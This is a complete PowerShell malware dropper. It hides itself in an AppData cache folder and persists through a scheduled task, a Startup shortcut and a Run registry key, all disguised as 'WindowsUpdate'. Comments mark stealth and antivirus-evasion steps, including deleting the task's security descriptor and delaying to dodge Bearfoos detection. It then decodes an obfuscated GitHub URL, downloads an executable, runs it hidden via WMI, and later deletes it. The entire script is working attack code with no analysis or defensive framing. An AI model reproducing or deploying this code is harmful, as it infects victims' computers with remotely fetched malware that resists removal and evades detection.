$ErrorActionPreference = 'SilentlyContinue'

# === SELF-PRESERVATION ===
$localPath = "$env:APPDATA\Microsoft\Windows\Caches\launcher.ps1"
$currentPath = $MyInvocation.MyCommand.Path

if ($Host.Name -eq 'ConsoleHost') {
    $null = Start-Job -ScriptBlock {
        param($path)
        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$path`"" -WindowStyle Hidden
    } -ArgumentList $MyInvocation.MyCommand.Path
    exit
}

function Save-ScriptToDisk {
    param([string]$Destination)
    $dir = Split-Path $Destination -Parent
    if (-not (Test-Path $dir)) { 
        New-Item -ItemType Directory -Path $dir -Force | Out-Null
    }
    if (-not $currentPath -or $currentPath -eq '') {
        try {
            $rawUrl = "https://raw.githubusercontent.com/astro-opensource/cloud-sync-tools/refs/heads/main/assets/launcher.ps1"
            (New-Object System.Net.WebClient).DownloadString($rawUrl) | Out-File -FilePath $Destination -Encoding UTF8 -Force
        } catch {
            exit
        }
    } else {
        Copy-Item -Path $currentPath -Destination $Destination -Force
    }
    return $Destination
}

$scriptPath = Save-ScriptToDisk -Destination $localPath

# === PERSISTENCE: Scheduled Task (Direct PowerShell) ===
$taskName = "WindowsUpdateTask"
if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
    $trigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
        "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$scriptPath`""
    ))
    
    $action = New-ScheduledTaskAction -Execute "powershell.exe" `
        -Argument "-EncodedCommand $encoded"
    
    $settings = New-ScheduledTaskSettingsSet `
        -AllowStartIfOnBatteries $true `
        -DontStopIfGoingOnBatteries $true `
        -StartWhenAvailable $true `
        -Hidden $true `
        -ExecutionTimeLimit (New-TimeSpan -Hours 2) `
        -Priority 7  # Lower priority helps hide it more
    
    Register-ScheduledTask -TaskName $taskName `
        -Action $action `
        -Trigger $trigger `
        -Settings $settings `
        -User $env:USERNAME `
        -Force | Out-Null
    
    # Nuke security descriptor for stealth
    $taskPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\$taskName"
    if (Test-Path $taskPath) {
        Remove-ItemProperty -Path $taskPath -Name "SecurityDescriptor" -Force -ErrorAction SilentlyContinue
    }
}

# === PERSISTENCE: Startup LNK (Direct PowerShell) ===
$lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateHelper.lnk"
if (-not (Test-Path $lnkPath)) {
    $wsh = New-Object -ComObject WScript.Shell
    $shortcut = $wsh.CreateShortcut($lnkPath)
    $shortcut.TargetPath = "powershell.exe"
    $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$scriptPath`""
    $shortcut.WorkingDirectory = "$env:APPDATA\Microsoft\Windows\Caches"
    $shortcut.WindowStyle = 7  # Hidden
    $shortcut.IconLocation = "C:\Windows\System32\shell32.dll,0"  # Looks legit
    $shortcut.Save()
}

# === REGISTRY RUN KEY (backup persistence) ===
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "WindowsUpdateHelper"
if (-not (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
    Set-ItemProperty -Path $regPath -Name $regName -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonInteractive -File `"$scriptPath`""
}

# === BEARFOOS EVASION: Delay before EXE ===
Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)

# === DOWNLOAD AND EXECUTE PAYLOAD ===
$cache = "$env:APPDATA\Microsoft\Windows\Caches"
if (-not (Test-Path $cache)) { New-Item -ItemType Directory -Path $cache -Force | Out-Null }

$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2FzdHJvLW9wZW5zb3VyY2UvY2xvdWQtc3luYy10b29scy9tYWluL2Fzc2V0cy9XaW5kb3dzVXBkYXRlSGVscGVyLmV4ZQ=='))
$exePath = "$cache\WindowsUpdateHelper.exe"

$headers = @{'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'}

if (-not (Test-Path $exePath)) {
    $retryCount = 0
    $maxRetries = 3
    do {
        try {
            Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing
            break
        } catch {
            $retryCount++
            Start-Sleep -Seconds 5
        }
    } while ($retryCount -lt $maxRetries)
}

if (Test-Path $exePath) {
    try {
        $wmiParams = @{
            ComputerName = $env:COMPUTERNAME
            CommandLine  = "`"$exePath`""
        }
        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $wmiParams.CommandLine -ErrorAction Stop | Out-Null
    } catch {
        try {
            $wsh = New-Object -ComObject WScript.Shell
            $wsh.Run("`"$exePath`"", 0, $false)
        } catch {
            Start-Process $exePath -WindowStyle Hidden
        }
    }
}

Start-Job -ScriptBlock {
    param($exe)
    Start-Sleep -Seconds 300
    Remove-Item -Path $exe -Force -ErrorAction SilentlyContinue
} -ArgumentList $exePath | Out-Null
